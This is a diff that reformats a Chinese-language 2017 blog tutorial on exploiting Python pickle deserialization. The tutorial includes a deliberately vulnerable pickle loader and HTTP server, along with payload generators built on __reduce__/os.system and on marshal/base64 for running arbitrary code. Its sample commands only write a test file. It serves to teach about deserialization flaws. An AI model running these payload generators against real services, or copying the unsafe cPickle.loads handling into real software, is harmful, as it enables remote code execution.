@@ -1,7 +1,7 @@
 Title: Python Pickle的任意代码执行漏洞实践和Payload构造
 Date: 2017-03-22 10:20
 Category: 漏洞实践
-Tags: python, Pickle, 漏洞,反序列化
+Tags: python,Pickle,漏洞,反序列化
 Slug: 
 Authors: bit4
 Summary: 
@@ -27,15 +27,15 @@ Summary:
  首先构造一个简单的包含漏洞的代码。后续的验证过程中，将生成的Payload放到poc.pickle文件中，使用该代码来读取PoC验证效果（我将其保存为pickle_verify.py）。
 
 ```python
-  # !/usr/bin/env python
-  # -*- coding:utf-8 -*-
-  __author__ = 'bit4'
-  __github__ = 'https://github.com/bit4woo'
-  __filename__ = 'pickle_verify.py'
-  
-  import pickle
-  
-  pickle.load(open('./poc.pickle'))
+# !/usr/bin/env python
+# -*- coding:utf-8 -*-
+__author__ = 'bit4'
+__github__ = 'https://github.com/bit4woo'
+__filename__ = 'pickle_verify.py'
+
+import pickle
+
+pickle.load(open('./poc.pickle'))
 ```
 
  值得注意的是，pickle有load和loads2个方法，load需要的参数是文件句柄，loads所需要的参数是字符串。
@@ -45,41 +45,41 @@ Summary:
  使用os.system执行命令的payload，保存为`pickle_poc_gen.py`
 
 ```python
-  # !/usr/bin/env python
-  # -*- coding:utf-8 -*-
-  __author__ = 'bit4'
-  __github__ = 'https://github.com/bit4woo'
-  __filename__ = 'pickle_poc_gen.py'
+# !/usr/bin/env python
+# -*- coding:utf-8 -*-
+__author__ = 'bit4'
+__github__ = 'https://github.com/bit4woo'
+__filename__ = 'pickle_poc_gen.py'
 
-  import cPickle
-  import os
-  import urllib
+import cPickle
+import os
+import urllib
 
-  class genpoc(object):
-      def __reduce__(self):
-          s = """echo test >poc.txt"""  #要执行的命令
-          return os.system, (s,)        #os.system("echo test >poc.txt")
+class genpoc(object):
+    def __reduce__(self):
+        s = """echo test >poc.txt"""  #要执行的命令
+        return os.system, (s,)        #os.system("echo test >poc.txt")
 
-  e = genpoc()
-  poc = cPickle.dumps(e)
+e = genpoc()
+poc = cPickle.dumps(e)
 
-  print poc
-  print urllib.quote(poc)
-  fp = open("poc.pickle","w")
-  fp.write(poc)
+print poc
+print urllib.quote(poc)
+fp = open("poc.pickle","w")
+fp.write(poc)
 ```
 
   
 
   输出内容，也就是Payload (poc)：
 
-      cnt
-      system
-      p1
-      (S’echo test >poc.txt’
-      p2
-      tRp3
-      .
+    cnt
+    system
+    p1
+    (S’echo test >poc.txt’
+    p2
+    tRp3
+    .
 
   url编码后的payload，用于URL中传递给web服务器：
 
@@ -92,44 +92,44 @@ Summary:
   我们先实现一个简单的httpserver（pickle_verify_httpserver.py）：
 
 ```python
-  # !/usr/bin/env python
-  # -*- coding:utf-8 -*-
-  __author__ = 'bit4'
-  __github__ = 'https://github.com/bit4woo'
-  __filename__ = 'pickle_verify_httpserver.py'
+# !/usr/bin/env python
+# -*- coding:utf-8 -*-
+__author__ = 'bit4'
+__github__ = 'https://github.com/bit4woo'
+__filename__ = 'pickle_verify_httpserver.py'
 
-  import BaseHTTPServer
-  import urllib
-  import cPickle
+import BaseHTTPServer
+import urllib
+import cPickle
 
-  class ServerHandler(BaseHTTPServer.BaseHTTPRequestHandler):
-      def do_GET(self):
-          if "?payload" in self.path:
-              query= urllib.splitquery(self.path)
-              action = query[1].split('=')[1]
-              print action
-              action = urllib.unquote(action)
-              print action
-              try:
-                  x = cPickle.loads(action) #string argv
-                  content = "command executed"
-              except Exception,e:
-                  print e
-                  content = e
-          else:
-              content = "hello World"
+class ServerHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+    def do_GET(self):
+        if "?payload" in self.path:
+            query= urllib.splitquery(self.path)
+            action = query[1].split('=')[1]
+            print action
+            action = urllib.unquote(action)
+            print action
+            try:
+                x = cPickle.loads(action) #string argv
+                content = "command executed"
+            except Exception,e:
+                print e
+                content = e
+        else:
+            content = "hello World"
 
-          self.send_response(200)
-          self.send_header("Content-type","text/html")
-          self.end_headers()
-          self.wfile.write("<html>")
-          self.wfile.write(" %s " % content)
-          self.wfile.write("</html>")
+        self.send_response(200)
+        self.send_header("Content-type","text/html")
+        self.end_headers()
+        self.wfile.write("<html>")
+        self.wfile.write(" %s " % content)
+        self.wfile.write("</html>")
 
-  if __name__ == '__main__':
-      srvr = BaseHTTPServer.HTTPServer(('',8000), ServerHandler)
-      print 'started httpserver...'
-      srvr.serve_forever()
+if __name__ == '__main__':
+    srvr = BaseHTTPServer.HTTPServer(('',8000), ServerHandler)
+    print 'started httpserver...'
+    srvr.serve_forever()
 ```
 
   
@@ -153,43 +153,40 @@ http://127.0.0.1:8000/?payload=cnt%0Asystem%0Ap1%0A(S%27echo%20test%20%3Epoc.txt
   但幸运的是，从python2.6起，包含了一个可以序列化code对象的模块–Marshal。由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo()， 所以有了如下代码：
 
 ```python
-  # !/usr/bin/env python
-  # -*- coding:utf-8 -*-
-  __author__ = 'bit4'
-  __github__ = 'https://github.com/bit4woo'
-  __filename__ = 'pickle_poc_gen0.py'
+# !/usr/bin/env python
+# -*- coding:utf-8 -*-
+__author__ = 'bit4'
+__github__ = 'https://github.com/bit4woo'
+__filename__ = 'pickle_poc_gen0.py'
 
-  import marshal
-  import base64
-  import cPickle
-  import urllib
+import marshal
+import base64
+import cPickle
+import urllib
 
-  def foo():#you should write your code in this function
-      import os
-      def fib(n):
-          if n <= 1:
-              return n
-          return fib(n-1) + fib(n-2)
-      print 'fib(10) =', fib(10)
-      os.system('echo anycode >>poc.txt')
+def foo():#you should write your code in this function
+    import os
+    def fib(n):
+        if n <= 1:
+            return n
+        return fib(n-1) + fib(n-2)
+    print 'fib(10) =', fib(10)
+    os.system('echo anycode >>poc.txt')
 
-  try:#尝试使用cPickle来序列号代码对象
-      cPickle.dumps(foo.func_code)
-  except Exception as e:
-      print e #TypeError: can't pickle code objects
+try:#尝试使用cPickle来序列号代码对象
+    cPickle.dumps(foo.func_code)
+except Exception as e:
+    print e #TypeError: can't pickle code objects
 
-  code_serialized = base64.b64encode(marshal.dumps(foo.func_code))
-  print code_serialized
+code_serialized = base64.b64encode(marshal.dumps(foo.func_code))
+print code_serialized
 ```
-
-  
 
   想要这段输出的base64的内容得到执行，我们需要如下代码：
 
-      (types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ”))()
+    (types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ”))()
 
   写得更容易阅读点就是这样：
-​    
 
 ```python
 code_str = base64.b64decode(code_enc)
@@ -212,62 +209,53 @@ func()
 
   .：结束pickle。
 
-  
-
   说人话：
 
-  
-
-  1.c：接下来的2行内容类似于，os.system、urllib.unquote是module.object的形式。
-
-  2.(：就是左括号
-
-  3.t：相当于右扩号
-
-  4.S：代表本行后面的内容是String，即字符串。
-
-  5.R：执行紧靠自己左边的一个括号对中的内容，即( 和他t直接的内容。
-
-  6..：点号结束pickle。
-
-  
+```
+c：接下来的2行内容类似于，os.system、urllib.unquote是module.object的形式。
+(：就是左括号
+t：相当于右扩号
+S：代表本行后面的内容是String，即字符串。
+R：执行紧靠自己左边的一个括号对中的内容，即( 和他t直接的内容。
+.：点号结束pickle。
+```
 
   图一
 
-  ![Image](./img/PickleRCE/Image.png)
+![Image](./img/PickleRCE/Image.png)
 
   最终的可以执行任意代码的payload生成器（第一种）,foo()函数中的部分是你应该自己编写替换的代码：
 
 ```python
-  # !/usr/bin/env python
-  # -*- coding:utf-8 -*-
-  __author__ = 'bit4'
-  __github__ = 'https://github.com/bit4woo'
-  __filename__ = 'pickle_poc_gen0.py'
+# !/usr/bin/env python
+# -*- coding:utf-8 -*-
+__author__ = 'bit4'
+__github__ = 'https://github.com/bit4woo'
+__filename__ = 'pickle_poc_gen0.py'
 
-  import marshal
-  import base64
-  import cPickle
-  import urllib
+import marshal
+import base64
+import cPickle
+import urllib
 
-  def foo():#you should write your code in this function
-      import os
-      def fib(n):
-          if n <= 1:
-              return n
-          return fib(n-1) + fib(n-2)
-      print 'fib(10) =', fib(10)
-      os.system('echo anycode >>poc.txt')
+def foo():#you should write your code in this function
+    import os
+    def fib(n):
+        if n <= 1:
+            return n
+        return fib(n-1) + fib(n-2)
+    print 'fib(10) =', fib(10)
+    os.system('echo anycode >>poc.txt')
 
-  try:#尝试使用cPickle来序列号代码对象
-      cPickle.dumps(foo.func_code)
-  except Exception as e:
-      print e #TypeError: can't pickle code objects
+try:#尝试使用cPickle来序列号代码对象
+    cPickle.dumps(foo.func_code)
+except Exception as e:
+    print e #TypeError: can't pickle code objects
 
-  code_serialized = base64.b64encode(marshal.dumps(foo.func_code))
-  print code_serialized
+code_serialized = base64.b64encode(marshal.dumps(foo.func_code))
+print code_serialized
 
-  
+
 #为了保证code_serialized中的内容得到执行，我们需要如下代码
 #(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), ''))()
 
@@ -356,15 +344,9 @@ else:
   eval(compile(%s,'<payload>’,’exec’)) % cmd
 ```
 
-
-
 对以上代码生成的payload进行了测试，也只是成功执行了未包含函数和类的python代码，包含函数和类的则未执行成功。
 
-
-
 **3.终极payload生成器**
-
-
 
 分析到最后，发现其实有老外已经做过更加底层，更加详细的分享，并且也提供了Poc生成脚本
 
@@ -377,7 +359,6 @@ else:
 <https://github.com/sensepost/anapickle>
 
 该工具中包含了大量的成熟payload，有了以上知识，不难理解其中的代码，也可以自己进行修改了。
-​    
 
 ## 0x03 参考
 
